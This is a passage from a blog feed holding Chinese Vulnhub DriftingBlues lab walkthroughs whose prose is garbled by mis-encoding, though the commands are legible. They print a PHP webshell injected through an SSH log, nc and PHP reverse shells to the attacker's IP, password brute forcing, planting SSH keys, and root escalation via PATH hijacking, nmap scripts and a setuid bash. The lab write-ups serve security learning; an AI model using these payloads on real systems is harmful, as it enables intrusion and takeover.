ftp://192.168.142.146</span><br></pre></td></tr></table></figure><p><strong><code>ç ´è§£å‡ºä¸€ä¸ª</code>FTP<code>ç™»å½•çš„ç”¨æˆ·åå’Œå¯†ç ï¼š</code>luther/mypics`</strong></p><p><img src="../images/image-20230427194706118.png" alt="image-20230427194706118"></p><p><img src="../images/image-20230427194157405.png" alt="image-20230427194157405"></p><p>æˆåŠŸç™»å…¥ï¼Œç„¶ååˆ‡æ¢åˆ°hubertç”¨æˆ·ä¸‹ï¼Œè¿™é‡Œçš„è¯å¯ä»¥å°è¯•ä¸€ä¸‹è¿›è¡Œsshç™»å½•ï¼Œå…ˆæ£€æŸ¥è¿™é‡Œæ˜¯å¦å­˜åœ¨<code>.ssh</code></p><p><img src="../images/image-20230427194342023.png" alt="image-20230427194342023"></p><p>æ²¡æœ‰çš„è¯åœ¨è¿™é‡Œå°±åˆ›å»ºä¸€ä¸ªï¼Œç„¶åå°±æ ¹æ®sshç™»å½•åŸç†è¿›è¡Œä¼ªé€ </p><p>å°±æ˜¯å…ˆåœ¨kaliä¸Šç”Ÿæˆssh  å…¬é’¥å’Œç§é’¥   ç„¶åæŠŠå…¬é’¥å¤åˆ¶åˆ°ftpæœåŠ¡å™¨ä¸Šï¼Œå¹¶ä¸”å‘½åä¸º<strong><code>authorized_keys</code></strong></p><p>ç„¶ååœ¨kaliä¸Šå°±å¯ä»¥ç”¨ç”Ÿæˆçš„ç§é’¥è¿›è¡Œè¯¥ç”¨æˆ·çš„ç™»å½•äº†</p><p><strong>sshç§é’¥ç™»å½•æ­¥éª¤</strong></p><p><strong>é¦–å…ˆå…ˆåœ¨<code>kaii</code>æœ¬åœ°ç”Ÿæˆç§˜é’¥<code>ssh-keygen</code> å°† <code>id_rsa.pub SSH</code> å…¬é’¥æ–‡ä»¶å¦å­˜ä¸º <code>authorized_keys</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230427194943659.png" alt="image-20230427194943659"></p><p>ç„¶åä¿®æ”¹å…¬é’¥çš„åå­—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv id_rsa.pub authorized_keys</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230427195031935.png" alt="image-20230427195031935"></p><p>ç„¶ååœ¨ftpæœåŠ¡å™¨ä¸Šä½¿ç”¨putå‘½ä»¤ï¼Œå°†<code>authorized_keys</code>ä¼ åˆ°æœåŠ¡å™¨ä¸Š</p><p><img src="../images/image-20230427195213888.png" alt="image-20230427195213888"></p><p>æˆåŠŸä¼ è¿›å»äº† è¿™é‡Œçš„è¯  è·¯å¾„å¾—ä¸€è‡´</p><p><img src="../images/image-20230427195251240.png" alt="image-20230427195251240"></p><p>é‚£ä¹ˆç™»å½•ftpçš„æ—¶å€™ï¼Œä¹Ÿå¿…é¡»åœ¨è¿™ä¸ªkaliè·¯å¾„ä¸‹ç™»å½•</p><p>é‚£ä¹ˆç°åœ¨å°±å¯ä»¥å¯¹hubertè¿›è¡Œsshç§é’¥ç™»å½•äº†</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 400 id_rsa</span><br><span class="line">ssh hubert@192.168.142.146 -i id_rsa</span><br></pre></td></tr></table></figure><p>ç„¶åå’ŒVulnhub DriftingBlues-3ä¸€æ ·çš„ææƒæ–¹æ³•ï¼Œä¸‹é¢å°±ä¸å¤šèµ˜è¿°äº†</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å…ˆæ‰«ä¸€ä¸‹cæ®µï¼Œå‘ç°ä¸€ä¸‹é¶æœºåœ°å€&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230427145027282.png&quot; alt=&quot;image-20230427145027282&quot;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åæ‰«ä¸€ä¸‹ç«¯å£&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;..</summary>
      
    
    
    
    
    <category term="Vulnhub DriftingBlues-4" scheme="https://ke1nys.github.io/tags/Vulnhub-DriftingBlues-4/"/>
    
  </entry>
  
  <entry>
    <title>DriftingBlues-3</title>
    <link href="https://ke1nys.github.io/posts/a7ffa01f.html"/>
    <id>https://ke1nys.github.io/posts/a7ffa01f.html</id>
    <published>2023-04-21T10:05:51.000Z</published>
    <updated>2023-04-26T13:05:32.228Z</updated>
    
    <content type="html"><![CDATA[<p>è¿˜æ˜¯å…ˆæ‰«ä¸€ä¸‹cæ®µ</p><p><img src="../images/image-20230421180643418.png" alt="image-20230421180643418"></p><p>è¿›è¡Œç«¯å£æ‰«æ</p><p><img src="../images/image-20230421180739563.png" alt="image-20230421180739563"></p><p>ç„¶åè¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230421180934567.png" alt="image-20230421180934567"></p><p>è¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230421181000421.png" alt="image-20230421181000421"></p><p><img src="../images/image-20230421181408827.png" alt="image-20230421181408827"></p><p><img src="../images/image-20230421181349395.png" alt="image-20230421181349395"></p><p>è®¿é—®ç»™çš„<code>/littlequeenofspades.html</code>  </p><p><img src="../images/image-20230421182129099.png" alt="image-20230421182129099"></p><p>ç„¶åæŸ¥çœ‹æºç ï¼Œå‘ç°ä¸€æ®µbase64ç¼–ç çš„ä»£ç ï¼Œç„¶åè¿›è¡Œè§£ç å‘ç°</p><p><img src="../images/image-20230421182611129.png" alt="image-20230421182611129"></p><p>äºæ˜¯è¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230421182643602.png" alt="image-20230421182643602"></p><p>å‘ç°è¿™æ˜¯ä¸ªsshæ—¥å¿—è®°å½•   å¯ä»¥å°è¯•è¿›è¡Œæ—¥å¿—é‡Œå†™åé—¨</p><p><strong>çœ‹åˆ°å‡ºç°<code>ssh auth log --&gt; ssh</code>èº«ä»½éªŒè¯æ—¥å¿—ï¼Œå¹¶ä¸”æ³¨æ„åˆ°ç™»å½•ç”¨æˆ·åæ˜¾ç¤ºåœ¨æ—¥å¿—ä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬ä½¿ç”¨sshç™»é™†æ—¶ï¼Œå°†ç”¨æˆ·åå†™æˆä¸€å¥è¯å°±å¯ä»¥å†™é©¬è¿›æ—¥å¿—ä¸­</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨å‘½ä»¤ï¼šssh &#x27;&lt;?php system($_GET[&quot;a&quot;]);?&gt;&#x27;@192.168.142.142</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421183202692.png" alt="image-20230421183202692"></p><p>ç„¶åå°è¯•çœ‹é©¬æœ‰æ²¡æœ‰å†™è¿›å»</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.142.144/adminsfixit.php?a=whoami</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421183448490.png" alt="image-20230421183448490"></p><p>å‘ç°å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ  ç„¶åè¿›è¡Œnc åå¼¹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kaliå¼€å¯ç›‘å¬ï¼šnc -lvnp 4444</span><br><span class="line">?xa=nc -e /bin/bash 192.168.142.129 4444</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27; #äº¤äº’shell</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421184535768.png" alt="image-20230421184535768"></p><p>åå¼¹æˆåŠŸï¼Œç„¶åè¿›è¡Œshelläº¤äº’</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27; </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421184638397.png" alt="image-20230421184638397"></p><p>å‘ç°è¿˜æ˜¯å­˜åœ¨<code>.ssh</code>  æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ç›´æ¥åœ¨ç›®æ ‡æœºç”Ÿæˆä¸€ä¸ªå…¬é’¥ï¼šssh-keygen -t rsa</span><br><span class="line">å°†ç”Ÿæˆçš„ç§é’¥ä¿å­˜åˆ°ï¼š/home/robertj/.ssh/id_rsa </span><br><span class="line">å°† SSH å…¬é’¥æ–‡ä»¶é‡å‘½åä¸º authorized_keys ï¼Œç”¨äº SSH ç™»é™†è®¤è¯</span><br><span class="line">cat id_rsa.pub &gt; authorized_keys</span><br><span class="line">ç„¶åå°†ç§é’¥å¤åˆ¶åˆ°æœ¬æœº</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421185302902.png" alt="image-20230421185302902"></p><p>ä¸€æ­¥ä¸€æ­¥è·Ÿç€æï¼Œç„¶åå°±ç”Ÿæˆäº†å¯†é’¥å’Œç§é’¥</p><p><a href="https://blog.csdn.net/Dontla/article/details/120902725">SSHå…¬é’¥åŸç†ï¼ˆå¯†é’¥ï¼Œç§˜é’¥ï¼Œç§é’¥ï¼‰</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh robertj@192.168.142.144 -i id_ssh</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421194215924.png" alt="image-20230421194215924"></p><p><img src="../images/image-20230421194359077.png" alt="image-20230421194359077"></p><p>suid  å‘ç°äº†ä¸€ä¸ªgetinfoå¯ä»¥è¿›è¡Œä½¿ç”¨</p><p><img src="../images/image-20230421194544476.png" alt="image-20230421194544476"></p><p>æ ¹æ®ä¸Šé¢è¾“å‡ºçš„ç»“æœï¼Œå¯ä»¥æ¨æµ‹è¿™ä¸ªç¨‹åºä¸­æ‰§è¡Œäº†</p><p><code>ip addr, cat /etc/hosts, uname -a</code><br>å› æ­¤ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç¯å¢ƒå˜é‡ PATH ä¸­æä¾›ä¸€ä¸ªç›®å½• (/tmp)ï¼Œå¹¶åˆ›å»ºä¸€ä¸ª ip<br>æˆ–è€… cat æ–‡ä»¶ï¼Œç”¨äºåŠ«æŒå‘½ä»¤ï¼Œæ‰§è¡Œæˆ‘ä»¬è‡ªå®šä¹‰çš„äºŒè¿›åˆ¶æ–‡ä»¶å°±å¯ä»¥ææƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">export PATH=/tmp/:$PATH</span><br><span class="line">cd /tmp</span><br><span class="line">echo &#x27;/bin/bash&#x27; &gt; ip</span><br><span class="line">chmod +x ip</span><br><span class="line">/usr/bin/getinfo</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421195813143.png" alt="image-20230421195813143"></p><p>æˆåŠŸææƒ</p><p><img src="../images/image-20230421195838680.png" alt="image-20230421195838680"></p><p><strong>æœ¬èŠ‚é€šè¿‡ä¿¡æ¯æ”¶é›†è·å–åˆ°æ•æ„Ÿæ–‡ä»¶ï¼Œè¿›è€Œ SSH æ—¥å¿—å†™åé—¨è·å– shellï¼Œç„¶åä¿¡æ¯æ”¶é›†</strong><br><strong>è·å– ssh ç§é’¥è·å– shellï¼Œæœ€ååˆ©ç”¨ suid-å‘½ä»¤åŠ«æŒææƒ</strong></p><p><strong>ä¿¡æ¯æ”¶é›†</strong><br><strong>Base64 è§£ç </strong><br><strong>sshæ—¥å¿—å†™åé—¨è·å– shell</strong><br><strong>ä¿¡æ¯æ”¶é›†è·å– ssh ç§é’¥è·å– shell</strong><br><strong>suid-å‘½ä»¤åŠ«æŒææƒ</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è¿˜æ˜¯å…ˆæ‰«ä¸€ä¸‹cæ®µ&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230421180643418.png&quot; alt=&quot;image-20230421180643418&quot;&gt;&lt;/p&gt;
&lt;p&gt;è¿›è¡Œç«¯å£æ‰«æ&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/</summary>
      
    
    
    
    
    <category term="DriftingBlues-3" scheme="https://ke1nys.github.io/tags/DriftingBlues-3/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhubâ€”â€”DriftingBlues-2</title>
    <link href="https://ke1nys.github.io/posts/1e26cf11.html"/>
    <id>https://ke1nys.github.io/posts/1e26cf11.html</id>
    <published>2023-04-21T08:07:27.000Z</published>
    <updated>2023-04-26T13:05:32.231Z</updated>
    
    <content type="html"><![CDATA[<p>(tmd,é…ç½®ä¸ªç½‘å¡é…ç½®åŠå¤©)</p><p>è¿˜æ˜¯å…ˆæ‰«ä¸€ä¸‹cæ®µ</p><p><img src="../images/image-20230421165628676.png" alt="image-20230421165628676"></p><p>ç„¶åè¿›è¡Œç«¯å£æ‰«æ</p><p><img src="../images/image-20230421170024112.png" alt="image-20230421170024112"></p><p>æ‰«æå‘ç°äº†ä¸‰ä¸ªç«¯å£  å¤šå‡ºæ¥çš„21ç«¯å£æ˜¯ftpæœåŠ¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å»å°è¯•ä¸€ä¸‹ï¼Œçœ‹èƒ½ä¸èƒ½åŒ¿åç™»å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.142.142</span><br><span class="line">ç”¨æˆ·åï¼šanonymous</span><br><span class="line">å¯†ç ï¼šç©º</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421170215786.png" alt="image-20230421170215786"></p><p>æˆåŠŸè¿›è¡Œç™»å½•</p><p>é‡Œé¢åªæœ‰ä¸€å¼ å›¾ç‰‡ï¼Œæ²¡å•¥ç”¨ï¼Œç„¶åè¿›è¡Œç«¯å£æ‰«æ</p><p><img src="../images/image-20230421170728331.png" alt="image-20230421170728331"></p><p><img src="../images/image-20230421170744040.png" alt="image-20230421170744040"></p><p>åªè®¿é—®è¿™ä¸ªblogçš„è¯æ˜¯wordpressæ¡†æ¶çš„</p><p>ç„¶åå°è¯•è¿›è¡Œä½¿ç”¨è¯¥æ¡†æ¶çš„æ‰«æå·¥å…·  <code>wpscan</code>è¿›è¡Œæ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.142.142/blog/ -e u</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421171032382.png" alt="image-20230421171032382"></p><p>æ‰«åˆ°ä¸€ä¸ªç”¨æˆ·   äºæ˜¯å°è¯•è¿›è¡Œå¯†ç ç ´è§£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.142.142/blog/ --passwords /usr/share/wordlists/rockyou.txt --usernames albert</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421171505615.png" alt="image-20230421171505615"></p><p>çˆ†ç ´åˆ°å¯†ç äº†</p><p><img src="../images/image-20230421171908888.png" alt="image-20230421171908888"></p><p>æ‰«åˆ°åå°äº†ï¼Œäºæ˜¯å°è¯•è¿›è¡Œç™»å½•</p><p><img src="../images/image-20230421172047872.png" alt="image-20230421172047872"></p><p>å¾—å…ˆè¿›è¡ŒåŸŸåçš„dnsé…ç½®å¥½</p><p><img src="../images/image-20230421172231456.png" alt="image-20230421172231456"></p><p>è¿›è¡Œä¿®æ”¹æˆåŠŸ</p><p><img src="../images/image-20230421172249279.png" alt="image-20230421172249279"></p><p><img src="../images/image-20230421172328984.png" alt="image-20230421172328984"></p><p>æˆåŠŸè¿›å…¥åå°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¾—å¯»æ‰¾å¯ä»¥è¿›è¡Œæ¼æ´åˆ©ç”¨çš„åœ°æ–¹äº†</p><p><img src="../images/59383e44fb3e4b81a094c70900c7777f.png" alt="img"></p><p>è¿™å°±æ˜¯æ¼æ´åˆ©ç”¨çš„ç‚¹</p><p>ä¿®æ”¹åçš„ä»£ç </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">ip=<span class="string">&quot;192.168.142.129&quot;</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">port=3333;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">sock=fsockopen(<span class="variable">$ip</span>, <span class="variable">$port</span>);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">descriptorspec=array(</span></span><br><span class="line">0=&gt;$sock,</span><br><span class="line">1=&gt;$sock,</span><br><span class="line">2=&gt;$sock</span><br><span class="line">);</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">process=proc_open(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span></span><br><span class="line"><span class="meta prompt_">proc_close($</span><span class="language-bash">process);</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421173119250.png" alt="image-20230421173119250"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://driftingblues.box/blog/index.php/xxx</span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„é¡µé¢ï¼Œå°±å¯ä»¥ç›´æ¥å¼¹shelläº†</p><p><img src="../images/image-20230421173724289.png" alt="image-20230421173724289"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨å‘½ä»¤ï¼špython -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>ç„¶åå°è¯•è¿›è¡Œææƒ</p><p>è¿›å…¥/home/freddieåå‘ç°å­˜åœ¨<strong>.ssh</strong>æ–‡ä»¶</p><p><img src="../images/image-20230421173917976.png" alt="image-20230421173917976"></p><p><img src="../images/image-20230421174018099.png" alt="image-20230421174018099"></p><p>å‘ç°å­˜åœ¨ç§é’¥å’Œå…¬é’¥</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•è¿›è¡Œsshç§é’¥ç™»å½•  </p><p><img src="../images/image-20230421175335627.png" alt="image-20230421175335627"></p><p>æŠŠç§é’¥è¿›è¡Œå¤åˆ¶è¿‡æ¥ï¼Œç„¶åç»™æƒé™ï¼Œç„¶åè¿›è¡Œç§é’¥ç™»å½•</p><p><img src="../images/image-20230421175515512.png" alt="image-20230421175515512"></p><p>ç›´æ¥è¿›è¡Œç§é’¥ç™»å½•äº†</p><p><img src="../images/image-20230421175554303.png" alt="image-20230421175554303"></p><p>æ‹¿åˆ°ç¬¬ä¸€ä¸ªflag</p><p><img src="../images/image-20230421175631172.png" alt="image-20230421175631172"></p><p>çŒœæµ‹æ˜¯ç”¨nampè¿›è¡Œææƒï¼Œç”¨çš„æ˜¯scriptæ¥è¿è¡Œè„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;os.execute(&#x27;/bin/bash&#x27;)&quot; &gt; getshell</span><br><span class="line">sudo nmap --script=getshell</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421175735156.png" alt="image-20230421175735156"></p><p>ç„¶åå°±å˜æˆäº†rootç”¨æˆ·äº†</p><p><img src="../images/image-20230421175816747.png" alt="image-20230421175816747"></p><p>æ‹¿åˆ°äº†å…¨éƒ¨çš„flagäº†</p><p><strong>æ€»ç»“</strong></p><p><strong>è¿™æ¬¡å‡ºç°äº†<code>21</code> ç«¯å£åŒ¿åç™»å…¥ä»¥åŠ<code>ssh</code> ç§é’¥ç™»å…¥ ï¼ˆæ–°çŸ¥è¯†ç‚¹ï¼‰</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;(tmd,é…ç½®ä¸ªç½‘å¡é…ç½®åŠå¤©)&lt;/p&gt;
&lt;p&gt;è¿˜æ˜¯å…ˆæ‰«ä¸€ä¸‹cæ®µ&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230421165628676.png&quot; alt=&quot;image-20230421165628676&quot;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åè¿›è¡Œç«¯å£æ‰«æ&lt;/p</summary>
      
    
    
    
    
    <category term="Vulnhub  DriftingBlues-2" scheme="https://ke1nys.github.io/tags/Vulnhub-DriftingBlues-2/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhubâ€”â€”DriftingBlues-1</title>
    <link href="https://ke1nys.github.io/posts/872f9eab.html"/>
    <id>https://ke1nys.github.io/posts/872f9eab.html</id>
    <published>2023-04-21T02:45:20.000Z</published>
    <updated>2023-04-26T13:05:32.226Z</updated>
    
    <content type="html"><![CDATA[<p>è¿˜æ˜¯å…ˆæ‰«ä¸€ä¸‹cæ®µï¼Œå‘ç°ä¸€ä¸‹é¶æœºçš„ä½ç½®</p><p><img src="../images/image-20230421105027528.png" alt="image-20230421105027528"></p><p>å‘ç°é¶æœºçš„ipåœ°å€ï¼Œäºæ˜¯å°è¯•è¿›è¡Œç«¯å£æ‰«æ</p><p><img src="../images/image-20230421105115877.png" alt="image-20230421105115877"></p><p>å‘ç°ä¸¤ä¸ªipç«¯å£ï¼Œäºæ˜¯å°è¯•è¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230421105203784.png" alt="image-20230421105203784"></p><p>å‘ç°ä¸€ä¸ªç½‘ç«™</p><p>å°±æ˜¯ä¸€ä¸ªé™æ€é¡µé¢ï¼Œäºæ˜¯å°è¯•è¿›è¡Œç›®å½•æ‰«æ(æ²¡æ‰«åˆ°ä¸œè¥¿)</p><p>äºæ˜¯æŸ¥çœ‹åŸæºç å‘ç°å­˜åœ¨ä¸€æ®µbase64ç¼–ç çš„ä¸œè¥¿</p><p><img src="../images/image-20230421105559764.png" alt="image-20230421105559764"></p><p>è¿›è¡Œè§£ç </p><p><img src="../images/image-20230421105639164.png" alt="image-20230421105639164"></p><p><img src="../images/image-20230421105711803.png" alt="image-20230421105711803"></p><p>å‘ç°è¿™ä¸€æ®µä¸²ä¸œè¥¿   ä¸€å¤§å †okï¼Œäºæ˜¯å°è¯•å»è¿›è¡Œokè§£ç </p><p><img src="../images/image-20230421110217495.png" alt="image-20230421110217495"></p><p>è§£ç æˆåŠŸ </p><p><a href="https://tool.bugku.com/brainfuck/">è§£ç åœ°å€</a></p><p><img src="../images/image-20230421110339515.png" alt="image-20230421110339515"></p><p>è¿™é‡Œçš„æç¤ºæ˜¯ä¿®æ”¹åŸŸåï¼Œäºæ˜¯æˆ‘ä»¬å°è¯•è¿›è¡ŒåŸŸåçš„ä¿®æ”¹</p><p><img src="../images/image-20230421110653338.png" alt="image-20230421110653338"></p><p><img src="../images/image-20230421110755477.png" alt="image-20230421110755477"></p><p>ç„¶åå°è¯•å¯¹è¯¥åŸŸåè¿›è¡Œå­åŸŸåæ‰«æ</p><p>ä½¿ç”¨çš„å·¥å…·æ˜¯<code>gobuster</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -u driftingblues.box -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt --append-domain</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯å¿…é¡»å¾—åŠ ä¸Š<code>--append-domain</code>ï¼Œä¸ç„¶æ‰«ä¸å‡ºæ¥ï¼Œå› ä¸ºè¿™é‡Œå¡äº†å¥½ä¹…</p><p><img src="../images/image-20230421113251849.png" alt="image-20230421113251849"></p><p><strong>è¿™é‡Œæœ‰æœ‰ä¸¤ä¸ª 200çš„çŠ¶æ€ç  æ‰€ä»¥æˆ‘ä»¬éœ€è¦æŠŠ<code>test.driftingblues.box</code>åŸŸåä¹Ÿæ·»åŠ åˆ°<code>hosts</code>ä¸­</strong></p><p><img src="../images/image-20230421113553783.png" alt="image-20230421113553783"></p><p>æˆåŠŸæ·»åŠ è¿›å»äº†</p><p><img src="../images/image-20230421113628547.png" alt="image-20230421113628547"></p><p>ä¸çŸ¥é“æ˜¯å•¥ä¸œè¥¿ï¼Œäºæ˜¯å…ˆå°è¯•è¿›è¡Œç›®å½•æ‰«æ</p><p><img src="../images/image-20230421113728120.png" alt="image-20230421113728120"></p><p>æ‰«åˆ°ä¸€ä¸ªçˆ¬è™«åè®®çš„æ–‡æœ¬</p><p><img src="../images/image-20230421113758790.png" alt="image-20230421113758790"></p><p><strong>äºæ˜¯æŒ¨ä¸ªè¿›è¡Œè®¿é—®</strong></p><p><img src="../images/image-20230421114124994.png" alt="image-20230421114124994"></p><p><img src="../images/image-20230421114138045.png" alt="image-20230421114138045"></p><p>é‚£ä¹ˆå¯†ç å°±æ˜¯æœ‰åç§å¯èƒ½æ€§ï¼Œä½†æ˜¯ç”¨æˆ·åå´ä¸çŸ¥é“ï¼Œè¿™é‡Œé¢çš„sherylä¸æ˜¯ç”¨æˆ·åï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ç»“åˆæˆ‘ä»¬å‰é¢çœ‹åˆ°çš„okè§£ç åçš„ericæ¥è¿›è¡Œå°è¯•</p><p>åˆ©ç”¨hydraè¿›è¡Œsshå¯†ç çˆ†ç ´</p><p><img src="../images/image-20230421115204314.png" alt="image-20230421115204314"></p><p>å°è¯•æˆåŠŸï¼Œäºæ˜¯è¿›è¡Œç™»å½•</p><p><img src="../images/image-20230421115306167.png" alt="image-20230421115306167"></p><p>ç™»å½•æˆåŠŸï¼Œäºæ˜¯å°è¯•è¿›è¡Œææƒæ“ä½œ</p><p>è¿˜æ˜¯è€ä¸‰æ · sudo -l   suid  å†…æ ¸ææƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">suid    find / -perm /4000 2&gt;/dev/n</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421115516649.png" alt="image-20230421115516649"></p><p>å‘ç°æ²¡å•¥å¯ç”¨çš„</p><p>æŸ¥çœ‹å†…æ ¸ä¹Ÿæ²¡å‘ç°å•¥å¯åˆ©ç”¨çš„ï¼Œäºæ˜¯å°±å»æŸ¥çœ‹å¤‡ä»½æ–‡ä»¶ï¼Œçœ‹æœ‰å•¥ä¸œè¥¿</p><p><img src="../images/image-20230421154847073.png" alt="image-20230421154847073"></p><p>å­˜åœ¨ä¸€ä¸ªå¤‡ä»½æ–‡ä»¶ï¼Œç„¶åè¿›è¡Œè¯»å–</p><p><img src="../images/image-20230421154945160.png" alt="image-20230421154945160"></p><p><strong>ç»§ç»­æŸ¥çœ‹ä¸€ä¸‹å¤‡ä»½æ–‡ä»¶<code>backup.sh</code> å‘ç°<code>sudo</code>æ‰§è¡Œ<code>/tmp/emergency</code>æ–‡ä»¶ ä½†æ˜¯<code>/tmp</code> ä¸‹é¢æ²¡æœ‰ éœ€è¦åˆ›å»º å¹¶å°†<code>eric</code>ç”¨æˆ·åŠ å…¥<code>sudo</code>ç»„</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;cp /bin/bash /tmp/getroot; chmod +s /tmp/getroot&#x27; &gt; /tmp/emergency</span><br><span class="line">chmod +x emergency</span><br><span class="line">./getroot -p</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421160008777.png" alt="image-20230421160008777"></p><p>è¿™é‡Œèƒ½è¿™æ ·å†™æ˜¯å› ä¸ºbackup.shæ˜¯ä¸€ä¸ªå®šæ—¶æ–‡ä»¶ï¼Œæ¯è¿‡ä¸€ä¼šå°±ä¼šæ‰§è¡Œé‡Œé¢çš„1ä»£ç </p><p>è¿™é‡Œèƒ½ç»™getrootæƒé™æ˜¯å› ä¸ºæ‰§è¡Œemergencyæ˜¯ä»¥sudoæ¥æ‰§è¡Œçš„ï¼Œå°±æ˜¯ä»¥rootæƒé™æ¥æ‰§è¡Œçš„</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è¿˜æ˜¯å…ˆæ‰«ä¸€ä¸‹cæ®µï¼Œå‘ç°ä¸€ä¸‹é¶æœºçš„ä½ç½®&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230421105027528.png&quot; alt=&quot;image-20230421105027528&quot;&gt;&lt;/p&gt;
